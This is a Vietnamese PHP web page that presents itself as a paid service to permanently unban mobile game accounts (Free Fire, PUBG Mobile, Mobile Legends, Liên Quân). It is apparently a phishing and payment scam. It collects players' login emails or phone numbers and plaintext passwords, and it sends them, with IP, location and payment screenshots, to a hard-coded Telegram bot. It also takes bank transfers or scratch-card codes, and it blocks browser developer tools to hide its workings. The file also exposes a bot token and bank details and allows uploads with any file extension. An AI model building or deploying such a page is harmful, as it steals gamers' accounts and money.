<?php
// ============================================
// TOOL MỞ BAND VĨNH VIỄN - PHP VERSION
// Bảo mật Server-Side - Không thể crack
// ============================================
session_start();
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// CONFIG
// ============================================
define('TELEGRAM_BOT_TOKEN', '8732357215:AAFmcjicU5ejU7xZ70vAmkG8Coqk-iDY3VI');
define('TELEGRAM_CHAT_ID', '8998147404');
define('TELEGRAM_API', 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN);
define('SITE_NAME', 'Tool Mở Band Vĩnh Viễn');
define('VERSION', '5.0 PHP');
define('BANK_ACCOUNT', '0644612345555');
define('BANK_NAME', 'MB Bank (Quân Đội)');
define('BANK_OWNER', 'Tran Nguyen Duc Minh');
define('CONTACT_TELEGRAM', '@admin_toolband');

// ============================================
// DATABASE CONFIG (Sử dụng SQLite)
// ============================================
$dbFile = __DIR__ . '/toolband.db';
$db = new SQLite3($dbFile);

// Tạo bảng nếu chưa có
$db->exec("CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    order_id TEXT UNIQUE,
    game TEXT,
    server TEXT,
    uid TEXT,
    account TEXT,
    password TEXT,
    plan TEXT,
    price INTEGER,
    status TEXT DEFAULT 'pending',
    ip TEXT,
    device_id TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    approved_at DATETIME,
    completed_at DATETIME
)");

$db->exec("CREATE TABLE IF NOT EXISTS banned_ips (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT UNIQUE,
    reason TEXT,
    banned_by TEXT,
    duration TEXT DEFAULT 'permanent',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS security_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT,
    ip TEXT,
    details TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS site_settings (
    key TEXT PRIMARY KEY,
    value TEXT
)");

// ============================================
// FUNCTIONS
// ============================================

// Lấy IP thật
function getUserIP() {
    $headers = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'HTTP_CF_CONNECTING_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

// Lấy vị trí IP
function getIPLocation($ip) {
    try {
        $json = @file_get_contents("https://ipapi.co/{$ip}/json/");
        return $json ? json_decode($json, true) : ['city' => 'Unknown', 'country_name' => 'Unknown', 'org' => 'N/A'];
    } catch (Exception $e) {
        return ['city' => 'Unknown', 'country_name' => 'Unknown', 'org' => 'N/A'];
    }
}

// Gửi Telegram
function sendTelegram($message, $parseMode = 'HTML') {
    $url = TELEGRAM_API . "/sendMessage";
    $data = json_encode([
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => $parseMode
    ]);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

// Gửi ảnh Telegram
function sendPhotoTelegram($photoPath, $caption = '') {
    $url = TELEGRAM_API . "/sendPhoto";
    
    $post = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'photo' => new CURLFile($photoPath),
        'caption' => $caption
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

// Tạo mã đơn hàng
function generateOrderId($type = 'ACC') {
    return strtoupper($type . '-' . substr(md5(uniqid()), 0, 8));
}

// Kiểm tra IP bị ban
function isIPBanned($ip) {
    global $db;
    $stmt = $db->prepare("SELECT * FROM banned_ips WHERE ip = :ip");
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $result = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $result ?: false;
}

// Ban IP
function banIP($ip, $reason, $bannedBy = 'System') {
    global $db;
    $stmt = $db->prepare("INSERT OR REPLACE INTO banned_ips (ip, reason, banned_by) VALUES (:ip, :reason, :by)");
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $stmt->bindValue(':reason', $reason, SQLITE3_TEXT);
    $stmt->bindValue(':by', $bannedBy, SQLITE3_TEXT);
    return $stmt->execute();
}

// Lấy setting
function getSetting($key, $default = '') {
    global $db;
    $stmt = $db->prepare("SELECT value FROM site_settings WHERE key = :key");
    $stmt->bindValue(':key', $key, SQLITE3_TEXT);
    $result = $stmt->execute()->fetchArray(SQLITE3_ASSOC);
    return $result ? $result['value'] : $default;
}

// Lưu setting
function setSetting($key, $value) {
    global $db;
    $stmt = $db->prepare("INSERT OR REPLACE INTO site_settings (key, value) VALUES (:key, :value)");
    $stmt->bindValue(':key', $key, SQLITE3_TEXT);
    $stmt->bindValue(':value', $value, SQLITE3_TEXT);
    return $stmt->execute();
}

// Log bảo mật
function securityLog($type, $details) {
    global $db;
    $ip = getUserIP();
    $stmt = $db->prepare("INSERT INTO security_logs (type, ip, details) VALUES (:type, :ip, :details)");
    $stmt->bindValue(':type', $type, SQLITE3_TEXT);
    $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
    $stmt->bindValue(':details', json_encode($details, JSON_UNESCAPED_UNICODE), SQLITE3_TEXT);
    $stmt->execute();
}

// Phát hiện crack
function detectCrack() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $indicators = [];
    
    // Bot/Curl detection
    if (empty($ua) || preg_match('/curl|wget|python|bot|crawl|spider/i', $ua)) {
        $indicators[] = 'Bot/Scanner detected: ' . $ua;
    }
    
    // SQL Injection detection
    $input = json_encode([$_GET, $_POST, $_COOKIE]);
    if (preg_match('/(union|select|insert|delete|update|drop|alter|exec|eval)/i', $input)) {
        $indicators[] = 'SQL Injection attempt';
    }
    
    // Rate limiting
    $ip = getUserIP();
    $rateFile = sys_get_temp_dir() . '/rate_' . md5($ip) . '.json';
    $requests = [];
    if (file_exists($rateFile)) {
        $requests = json_decode(file_get_contents($rateFile), true) ?: [];
    }
    $requests = array_filter($requests, fn($t) => time() - $t < 60);
    $requests[] = time();
    file_put_contents($rateFile, json_encode(array_slice($requests, -50)));
    
    if (count($requests) > 30) {
        $indicators[] = 'Rate limit exceeded';
    }
    
    if (!empty($indicators)) {
        $alert = "🚨 <b>CẢNH BÁO BẢO MẬT PHP</b>\n";
        $alert .= "⏰ " . date('Y-m-d H:i:s') . "\n";
        $alert .= "🌐 IP: <code>{$ip}</code>\n";
        $alert .= "📝 " . implode("\n", $indicators);
        
        sendTelegram($alert);
        securityLog('CRACK_ATTEMPT', ['indicators' => $indicators]);
        banIP($ip, implode(' | ', $indicators));
        
        header('HTTP/1.0 403 Forbidden');
        die("<h1>403 Forbidden</h1><p>Your IP has been logged.</p>");
    }
}

// ============================================
// XỬ LÝ REQUEST
// ============================================
$userIP = getUserIP();

// Kiểm tra IP ban
$banInfo = isIPBanned($userIP);
if ($banInfo) {
    header('HTTP/1.0 403 Forbidden');
    die("<!DOCTYPE html><html><head><title>403</title></head><body style='background:#000;color:#f00;text-align:center;padding:50px;'><h1>🚫 IP BỊ CHẶN</h1><p>IP: {$userIP}</p><p>Lý do: {$banInfo['reason']}</p></body></html>");
}

// Phát hiện crack
detectCrack();

// Xử lý POST request (submit form)
$message = '';
$messageType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_order'])) {
    // Validate
    $uid = trim($_POST['uid'] ?? '');
    $account = trim($_POST['account'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $game = trim($_POST['game'] ?? 'freefire');
    $server = trim($_POST['server'] ?? 'vietnam');
    $plan = trim($_POST['plan'] ?? 'basic');
    $captcha = intval($_POST['captcha'] ?? 0);
    $captchaResult = intval($_POST['captcha_result'] ?? 0);
    
    $prices = ['basic' => 150000, 'vip' => 300000, 'ultimate' => 500000];
    $price = $prices[$plan] ?? 150000;
    
    if (empty($uid) || empty($account) || empty($password)) {
        $message = '❌ Vui lòng nhập đầy đủ thông tin!';
        $messageType = 'error';
    } elseif ($captcha !== $captchaResult) {
        $message = '❌ Mã xác nhận không đúng!';
        $messageType = 'error';
    } else {
        // Tạo đơn hàng
        $orderId = generateOrderId();
        
        // Lưu database
        $stmt = $db->prepare("INSERT INTO orders (order_id, game, server, uid, account, password, plan, price, ip) VALUES (:oid, :game, :server, :uid, :acc, :pass, :plan, :price, :ip)");
        $stmt->bindValue(':oid', $orderId, SQLITE3_TEXT);
        $stmt->bindValue(':game', $game, SQLITE3_TEXT);
        $stmt->bindValue(':server', $server, SQLITE3_TEXT);
        $stmt->bindValue(':uid', $uid, SQLITE3_TEXT);
        $stmt->bindValue(':acc', $account, SQLITE3_TEXT);
        $stmt->bindValue(':pass', $password, SQLITE3_TEXT);
        $stmt->bindValue(':plan', $plan, SQLITE3_TEXT);
        $stmt->bindValue(':price', $price, SQLITE3_INTEGER);
        $stmt->bindValue(':ip', $userIP, SQLITE3_TEXT);
        $stmt->execute();
        
        // Gửi Telegram
        $msg = "🔔 <b>ĐƠN HÀNG MỚI #{$orderId}</b>\n";
        $msg .= "━━━━━━━━━━━━━━━━━━\n";
        $msg .= "🎮 Game: {$game}\n";
        $msg .= "🌐 Server: {$server}\n";
        $msg .= "👤 UID: <code>{$uid}</code>\n";
        $msg .= "📧 TK: {$account}\n";
        $msg .= "🔐 MK: <code>{$password}</code>\n";
        $msg .= "💎 Gói: {$plan}\n";
        $msg .= "💰 Giá: " . number_format($price) . "đ\n";
        $msg .= "🌐 IP: <code>{$userIP}</code>\n";
        $msg .= "⏰ " . date('Y-m-d H:i:s');
        
        sendTelegram($msg);
        
        // Xử lý upload ảnh
        if (isset($_FILES['payment_image']) && $_FILES['payment_image']['error'] === UPLOAD_ERR_OK) {
            $uploadDir = __DIR__ . '/uploads/';
            if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
            
            $ext = pathinfo($_FILES['payment_image']['name'], PATHINFO_EXTENSION);
            $fileName = $orderId . '.' . $ext;
            $filePath = $uploadDir . $fileName;
            
            if (move_uploaded_file($_FILES['payment_image']['tmp_name'], $filePath)) {
                sendPhotoTelegram($filePath, "📸 Ảnh CK - #{$orderId}");
            }
        }
        
        $message = "✅ Đơn hàng #{$orderId} đã được gửi! Vui lòng chờ admin duyệt.";
        $messageType = 'success';
        
        // Gửi thông báo cho admin
        $location = getIPLocation($userIP);
        sendTelegram("📍 <b>Vị trí KH:</b> {$location['city']}, {$location['country_name']}\n🏢 ISP: {$location['org']}");
    }
}

// ============================================
// TẠO CAPTCHA
// ============================================
$a = rand(1, 10);
$b = rand(1, 10);
$captchaResult = $a + $b;
$captchaQuestion = "{$a} + {$b}";

// ============================================
// GIÁ THEO GAME/SERVER
// ============================================
$prices = [
    'basic' => ['name' => 'Cơ Bản', 'price' => 150000, 'time' => '30-45'],
    'vip' => ['name' => 'VIP', 'price' => 300000, 'time' => '10-15'],
    'ultimate' => ['name' => 'Ultimate', 'price' => 500000, 'time' => '5-10']
];

// ============================================
// GIAO DIỆN
// ============================================
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title><?php echo SITE_NAME; ?> v<?php echo VERSION; ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-primary: #0a0f1e;
            --bg-secondary: #141b2b;
            --bg-card: rgba(20, 28, 45, 0.85);
            --text-primary: #eef5ff;
            --text-secondary: #b0d4ff;
            --accent: #00e6ff;
            --gold: #ffd966;
            --success: #2ecc71;
            --danger: #ff6b6b;
            --warning: #f39c12;
            --border: rgba(0, 255, 200, 0.25);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;
            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
            color: var(--text-primary);
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            -webkit-user-select: none;
            user-select: none;
        }

        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-image: linear-gradient(rgba(0, 255, 196, 0.03) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(0, 255, 196, 0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }

        .main-wrapper { max-width: 900px; margin: 0 auto; position: relative; z-index: 2; }

        .container {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 36px;
            padding: 30px 25px 35px;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5);
            margin-bottom: 30px;
        }

        h1 {
            font-size: 2.2rem;
            font-weight: 800;
            background: linear-gradient(to right, #ffd966, #ffb347, #ff8c42);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-align: center;
        }

        .header-info {
            text-align: right;
            margin-bottom: 10px;
            display: flex;
            flex-wrap: wrap;
            justify-content: flex-end;
            gap: 8px;
            align-items: center;
        }

        .header-badge {
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 0.75rem;
            font-weight: bold;
        }

        .section-title {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--accent);
            margin: 20px 0 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .flex-center {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
        }

        .btn-option {
            background: #1d2c45;
            border: 2px solid #2e405b;
            border-radius: 40px;
            padding: 10px 22px;
            font-weight: 600;
            color: #cfdefa;
            cursor: pointer;
            transition: 0.2s;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.95rem;
        }

        .btn-option.active {
            background: #0077ff;
            border-color: #00e6ff;
            color: white;
            box-shadow: 0 0 20px rgba(0, 119, 255, 0.5);
        }

        .game-option.active { background: #e74c3c; border-color: #ff6b6b; }
        .payment-option.active { background: #f39c12; border-color: #f1c40f; color: #0a0f1e; }

        .pricing-table {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .plan {
            background: rgba(10, 20, 38, 0.8);
            border: 2px solid #2e405b;
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
        }

        .plan:hover { transform: translateY(-3px); }
        .plan.selected {
            border-color: #f39c12;
            background: rgba(243, 156, 18, 0.15);
            box-shadow: 0 0 20px rgba(243, 156, 18, 0.3);
        }

        .plan-price {
            font-size: 1.8rem;
            font-weight: bold;
            color: #ffd966;
        }

        .input-field {
            width: 100%;
            padding: 14px 18px;
            border-radius: 40px;
            border: 1px solid #3f5580;
            background: #0b1322;
            color: white;
            font-size: 1rem;
            outline: none;
            font-family: inherit;
            transition: 0.2s;
        }

        .input-field:focus {
            border-color: #00c8ff;
            box-shadow: 0 0 12px rgba(0, 119, 255, 0.3);
        }

        .btn-submit {
            background: linear-gradient(180deg, #00c9a7 0%, #0077b6 100%);
            border: none;
            border-radius: 60px;
            padding: 16px 25px;
            width: 100%;
            font-weight: 800;
            font-size: 1.4rem;
            color: white;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-submit:hover {
            transform: scale(1.02);
            box-shadow: 0 15px 35px rgba(0, 166, 255, 0.5);
        }

        .info-box {
            border-radius: 24px;
            padding: 18px;
            margin: 20px 0;
        }

        .info-box.bank {
            background: rgba(0, 180, 216, 0.1);
            border: 1px solid #00c8ff;
        }

        .info-box.card {
            background: rgba(243, 156, 18, 0.1);
            border: 1px solid #f39c12;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
            margin: 8px 0;
        }

        .file-upload {
            background: rgba(10, 20, 38, 0.8);
            border: 2px dashed #3f5580;
            border-radius: 20px;
            padding: 30px 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }

        .file-upload:hover {
            border-color: #00c8ff;
            background: rgba(0, 200, 255, 0.05);
        }

        .hidden { display: none; }

        .alert {
            padding: 15px 20px;
            border-radius: 15px;
            margin: 15px 0;
            font-weight: 600;
        }

        .alert-success {
            background: rgba(46, 204, 113, 0.15);
            border: 1px solid #2ecc71;
            color: #2ecc71;
        }

        .alert-error {
            background: rgba(255, 107, 107, 0.15);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
        }

        .footer-text {
            text-align: center;
            color: #4a5a7a;
            font-size: 0.75rem;
            margin-top: 20px;
        }

        @media (max-width: 600px) {
            .container { padding: 20px 15px; }
            h1 { font-size: 1.8rem; }
            .pricing-table { grid-template-columns: 1fr; }
            .btn-option { font-size: 0.8rem; padding: 8px 15px; }
        }
    </style>
</head>
<body>
    <div class="main-wrapper">
        <div class="container">
            <!-- Header -->
            <div class="header-info">
                <span class="header-badge" style="background:rgba(155,89,182,0.1);border:1px solid #9b59b6;">
                    <i class="fas fa-fingerprint"></i> <?php echo substr(md5($userIP), 0, 8); ?>
                </span>
                <span class="header-badge" style="background:linear-gradient(135deg,#f39c12,#e74c3c);color:white;">
                    <i class="fas fa-crown"></i> PHP v<?php echo VERSION; ?>
                </span>
                <span class="header-badge" style="background:rgba(0,200,255,0.1);border:1px solid #00c8ff;">
                    <i class="fas fa-globe"></i> <?php echo htmlspecialchars($userIP); ?>
                </span>
            </div>

            <!-- Logo -->
            <div style="text-align:center;font-size:3.5rem;color:#00e6ff;margin-bottom:10px;">
                <i class="fas fa-shield-haltered"></i>
            </div>
            
            <h1>MỞ BAND VĨNH VIỄN</h1>
            <div style="text-align:center;color:#b0d4ff;margin-bottom:20px;">
                <i class="fas fa-check-circle"></i> PHP Server-Side • Bảo Mật Tuyệt Đối • Auto Telegram
            </div>

            <?php if ($message): ?>
            <div class="alert alert-<?php echo $messageType; ?>">
                <?php echo $message; ?>
            </div>
            <?php endif; ?>

            <!-- Form -->
            <form method="POST" enctype="multipart/form-data" id="orderForm">
                <!-- Game Selection -->
                <div class="section-title"><i class="fas fa-gamepad"></i> Chọn Game</div>
                <div class="flex-center" id="gameSelector">
                    <div class="btn-option game-option active" data-game="freefire" onclick="selectOption(this, 'game')">🔥 Free Fire</div>
                    <div class="btn-option game-option" data-game="pubg" onclick="selectOption(this, 'game')">🎯 PUBG Mobile</div>
                    <div class="btn-option game-option" data-game="mobilelegends" onclick="selectOption(this, 'game')">⚔️ Mobile Legends</div>
                    <div class="btn-option game-option" data-game="lienquan" onclick="selectOption(this, 'game')">🐉 Liên Quân</div>
                </div>
                <input type="hidden" name="game" id="gameInput" value="freefire">

                <!-- Server -->
                <div class="section-title"><i class="fas fa-server"></i> Chọn Server</div>
                <div class="flex-center">
                    <div class="btn-option active" data-server="vietnam" onclick="selectOption(this, 'server')">🇻🇳 Việt Nam</div>
                    <div class="btn-option" data-server="indonesia" onclick="selectOption(this, 'server')">🇮🇩 Indonesia</div>
                    <div class="btn-option" data-server="thailand" onclick="selectOption(this, 'server')">🇹🇭 Thái Lan</div>
                    <div class="btn-option" data-server="brazil" onclick="selectOption(this, 'server')">🇧🇷 Brazil</div>
                </div>
                <input type="hidden" name="server" id="serverInput" value="vietnam">

                <!-- Pricing -->
                <div class="section-title"><i class="fas fa-crown"></i> Gói Dịch Vụ</div>
                <div class="pricing-table">
                    <?php foreach ($prices as $key => $plan): ?>
                    <div class="plan <?php echo $key === 'basic' ? 'selected' : ''; ?>" data-plan="<?php echo $key; ?>" onclick="selectPlan(this)">
                        <h3><?php echo $plan['name']; ?></h3>
                        <div class="plan-price"><?php echo number_format($plan['price']); ?>đ</div>
                        <div style="color:#9aa9c1;">⏱ <?php echo $plan['time']; ?> phút</div>
                    </div>
                    <?php endforeach; ?>
                </div>
                <input type="hidden" name="plan" id="planInput" value="basic">

                <!-- Payment -->
                <div class="section-title"><i class="fas fa-wallet"></i> Thanh Toán</div>
                <div class="flex-center">
                    <div class="btn-option payment-option active" data-method="bank" onclick="selectPayment(this)">🏦 Chuyển khoản</div>
                    <div class="btn-option payment-option" data-method="card" onclick="selectPayment(this)">💳 Thẻ cào</div>
                </div>

                <!-- Bank Info -->
                <div class="info-box bank" id="bankInfo">
                    <div class="info-row"><strong>🏦 <?php echo BANK_NAME; ?></strong></div>
                    <div class="info-row"><strong>👤 <?php echo BANK_OWNER; ?></strong></div>
                    <div class="info-row">
                        <span><strong>💳 <?php echo BANK_ACCOUNT; ?></strong></span>
                        <button type="button" class="btn-option" style="padding:5px 15px;font-size:0.8rem;" onclick="copyText('<?php echo BANK_ACCOUNT; ?>')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <div class="info-row">
                        <span><strong>💰 Số tiền:</strong> <span id="displayPrice">150.000</span> VNĐ</span>
                    </div>
                    <div class="info-row" style="color:#ffd966;">
                        <span><strong>📌 Nội dung CK:</strong> MOBAND</span>
                    </div>
                </div>

                <!-- Card Info -->
                <div class="info-box card hidden" id="cardInfo">
                    <div class="info-row"><strong>📱 Nhà mạng:</strong> Viettel, Mobifone, Vinaphone</div>
                    <div style="margin-top:15px;">
                        <select class="input-field" name="card_type">
                            <option>Viettel</option>
                            <option>Mobifone</option>
                            <option>Vinaphone</option>
                        </select>
                    </div>
                    <div style="margin-top:15px;">
                        <input type="text" class="input-field" name="card_code" placeholder="Mã thẻ cào">
                    </div>
                    <div style="margin-top:15px;">
                        <input type="text" class="input-field" name="card_serial" placeholder="Số Seri">
                    </div>
                </div>

                <!-- Upload -->
                <div style="margin:20px 0;">
                    <label style="color:#b0d4ff;margin-bottom:8px;display:block;">
                        <i class="fas fa-camera"></i> Ảnh chuyển khoản <span style="color:#ff6b6b;">*</span>
                    </label>
                    <div class="file-upload" onclick="document.getElementById('paymentImage').click()">
                        <div id="uploadPlaceholder">
                            <i class="fas fa-cloud-upload-alt" style="font-size:3rem;color:#00c8ff;"></i>
                            <p style="color:#9aa9c1;">Nhấp để tải ảnh lên</p>
                        </div>
                        <img id="imagePreview" style="display:none;max-width:100%;max-height:300px;border-radius:12px;">
                    </div>
                    <input type="file" id="paymentImage" name="payment_image" accept="image/*" style="display:none;" onchange="previewImage(event)">
                </div>

                <!-- Account Info -->
                <div style="background:rgba(10,20,38,0.8);border-radius:28px;padding:25px 20px;margin:20px 0;border:1px solid rgba(0,200,255,0.4);">
                    <div class="section-title"><i class="fas fa-bolt"></i> Thông Tin Tài Khoản</div>
                    
                    <div style="margin-top:16px;">
                        <label style="color:#b0d4ff;">🆔 ID tài khoản game <span style="color:#ff6b6b;">*</span></label>
                        <input type="text" class="input-field" name="uid" placeholder="Nhập UID tài khoản" required>
                    </div>
                    <div style="margin-top:16px;">
                        <label style="color:#b0d4ff;">📧 Email / SĐT <span style="color:#ff6b6b;">*</span></label>
                        <input type="text" class="input-field" name="account" placeholder="Email hoặc số điện thoại" required>
                    </div>
                    <div style="margin-top:16px;">
                        <label style="color:#b0d4ff;">🔐 Mật khẩu <span style="color:#ff6b6b;">*</span></label>
                        <input type="password" class="input-field" name="password" placeholder="Nhập mật khẩu" required>
                    </div>
                    <div style="margin-top:16px;">
                        <label style="color:#b0d4ff;">🤖 <?php echo $captchaQuestion; ?> = ?</label>
                        <input type="number" class="input-field" name="captcha" placeholder="Nhập kết quả" required>
                        <input type="hidden" name="captcha_result" value="<?php echo $captchaResult; ?>">
                    </div>
                </div>

                <button type="submit" name="submit_order" class="btn-submit">
                    <i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND
                </button>
            </form>
        </div>

        <div class="footer-text">
            © 2026 <?php echo SITE_NAME; ?> v<?php echo VERSION; ?> | PHP Server-Side | IP: <?php echo substr($userIP, 0, 3); ?>***<br>
            Bảo mật tuyệt đối - Code PHP không thể xem từ client
        </div>
    </div>

    <script>
        // ============================================
        // ANTI-CRACK CLIENT-SIDE (LỚP BẢO VỆ THỨ 2)
        // ============================================
        (function() {
            // Chống F12
            setInterval(function() {
                if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
                    document.body.innerHTML = '<div style="color:red;text-align:center;padding:50px;"><h1>🚨 BẢO MẬT</h1><p>DevTools bị cấm! IP của bạn đã được ghi lại.</p></div>';
                    fetch('/alert.php?reason=DevTools&ip=<?php echo $userIP; ?>');
                }
            }, 500);

            // Chặn phím
            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73,74,67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode === 85)) {
                    e.preventDefault();
                    return false;
                }
            }, true);

            // Chặn chuột phải
            document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
        })();

        // ============================================
        // UI FUNCTIONS
        // ============================================
        function selectOption(el, type) {
            el.parentElement.querySelectorAll('.btn-option').forEach(o => o.classList.remove('active'));
            el.classList.add('active');
            document.getElementById(type + 'Input').value = el.dataset[type];
        }

        function selectPlan(el) {
            document.querySelectorAll('.plan').forEach(p => p.classList.remove('selected'));
            el.classList.add('selected');
            document.getElementById('planInput').value = el.dataset.plan;
            
            var prices = {basic: 150000, vip: 300000, ultimate: 500000};
            document.getElementById('displayPrice').textContent = prices[el.dataset.plan].toLocaleString();
        }

        function selectPayment(el) {
            document.querySelectorAll('.payment-option').forEach(o => o.classList.remove('active'));
            el.classList.add('active');
            document.getElementById('bankInfo').classList.toggle('hidden', el.dataset.method !== 'bank');
            document.getElementById('cardInfo').classList.toggle('hidden', el.dataset.method !== 'card');
        }

        function previewImage(event) {
            var reader = new FileReader();
            reader.onload = function() {
                document.getElementById('imagePreview').src = reader.result;
                document.getElementById('imagePreview').style.display = 'block';
                document.getElementById('uploadPlaceholder').style.display = 'none';
            };
            reader.readAsDataURL(event.target.files[0]);
        }

        function copyText(text) {
            navigator.clipboard.writeText(text).then(function() {
                Swal.fire({icon: 'success', title: '✅ Đã sao chép!', timer: 1500, showConfirmButton: false});
            });
        }
    </script>
</body>
</html>
